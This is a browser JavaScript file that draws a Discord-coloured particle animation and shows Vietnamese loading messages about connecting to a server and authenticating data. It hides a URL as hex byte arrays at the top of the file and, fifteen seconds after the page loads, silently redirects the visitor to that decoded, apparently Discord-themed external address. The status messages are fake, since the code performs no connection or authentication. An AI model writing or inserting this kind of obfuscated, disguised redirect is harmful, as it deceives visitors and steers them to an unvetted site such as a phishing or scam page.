
(function () {
    'use strict';

    var _0xCore = [
        [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f],
        [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74],
        [0x61,0x75,0x74,0x6f,0x2e,0x73,0x70,0x61,0x63,0x65],
        [0x2d,0x7a,0x2e,0x61,0x69,0x2f]
    ];

    var target = _0xCore[0]
        .concat(_0xCore[1], _0xCore[2], _0xCore[3])
        .map(function (c) {
            return String.fromCharCode(c);
        })
        .join('');

    var cv = document.getElementById('particleCanvas');

    if (!cv) return;

    var cx = cv.getContext('2d');

    var ps = [];

    var ms = {
        x: -999,
        y: -999
    };

    var cl = [
        [88,101,242],
        [235,69,158],
        [87,242,135],
        [254,231,92]
    ];

    function resize() {
        cv.width = innerWidth;
        cv.height = innerHeight;
    }

    resize();

    addEventListener('resize', resize);

    document.addEventListener('mousemove', function (e) {
        ms.x = e.clientX;
        ms.y = e.clientY;
    });

    function P() {
        this.reset();
    }

    P.prototype.reset = function () {

        this.x = Math.random() * cv.width;
        this.y = Math.random() * cv.height;

        this.s = Math.random() * 2 + .5;

        this.vx = (Math.random() - .5) * .25;
        this.vy = (Math.random() - .5) * .25;

        var c = cl[Math.floor(Math.random() * cl.length)];

        this.r = c[0];
        this.g = c[1];
        this.b = c[2];

        this.a = Math.random() * .4 + .1;

        this.life = Math.random() * 400 + 200;
        this.ml = this.life;
    };

    P.prototype.update = function () {

        var dx = ms.x - this.x;
        var dy = ms.y - this.y;

        var d = Math.sqrt(dx * dx + dy * dy);

        if (d < 120) {

            var f = (120 - d) / 120;

            this.vx -= (dx / d) * f * .015;
            this.vy -= (dy / d) * f * .015;
        }

        this.vx *= .99;
        this.vy *= .99;

        this.x += this.vx;
        this.y += this.vy;

        this.life--;

        if (
            this.life <= 0 ||
            this.x < -20 ||
            this.x > cv.width + 20 ||
            this.y < -20 ||
            this.y > cv.height + 20
        ) {
            this.reset();
        }
    };

    P.prototype.draw = function () {

        var ratio = this.life / this.ml;

        var fa =
            ratio < .1
            ? ratio * 10
            : (ratio > .9 ? (1 - ratio) * 10 : 1);

        cx.beginPath();

        cx.arc(
            this.x,
            this.y,
            this.s,
            0,
            Math.PI * 2
        );

        cx.fillStyle =
            'rgba(' +
            this.r + ',' +
            this.g + ',' +
            this.b + ',' +
            (this.a * fa).toFixed(3) +
            ')';

        cx.fill();
    };

    var n = Math.min(
        60,
        Math.floor(innerWidth * innerHeight / 18000)
    );

    for (var i = 0; i < n; i++) {
        ps.push(new P());
    }

    function lines() {

        for (var i = 0; i < ps.length; i++) {

            for (var j = i + 1; j < ps.length; j++) {

                var dx = ps[i].x - ps[j].x;
                var dy = ps[i].y - ps[j].y;

                var dd = dx * dx + dy * dy;

                if (dd < 14400) {

                    cx.beginPath();

                    cx.moveTo(ps[i].x, ps[i].y);
                    cx.lineTo(ps[j].x, ps[j].y);

                    cx.strokeStyle =
                        'rgba(88,101,242,' +
                        ((1 - Math.sqrt(dd) / 120) * .06).toFixed(4) +
                        ')';

                    cx.lineWidth = .5;

                    cx.stroke();
                }
            }
        }
    }

    function loop() {

        cx.clearRect(0, 0, cv.width, cv.height);

        for (var i = 0; i < ps.length; i++) {
            ps[i].update();
            ps[i].draw();
        }

        lines();

        requestAnimationFrame(loop);
    }

    loop();

    var msgs = [
        'Đang kết nối đến máy chủ',
        'Đang xác thực dữ liệu',
        'Đang tải tài nguyên',
        'Đang khởi chạy hệ thống'
    ];

    var si = 0;

    function cycle() {

        var el = document.getElementById('statusText');

        if (!el) return;

        if (si < msgs.length) {

            el.innerHTML =
                msgs[si++] +
                '<span class="dot">.</span>' +
                '<span class="dot">.</span>' +
                '<span class="dot">.</span>';

            setTimeout(cycle, 3750);
        }
    }

    document.addEventListener('DOMContentLoaded', function () {

        cycle();

        setTimeout(function () {

            window.location.href = target;

        }, 15000);

    });

})();
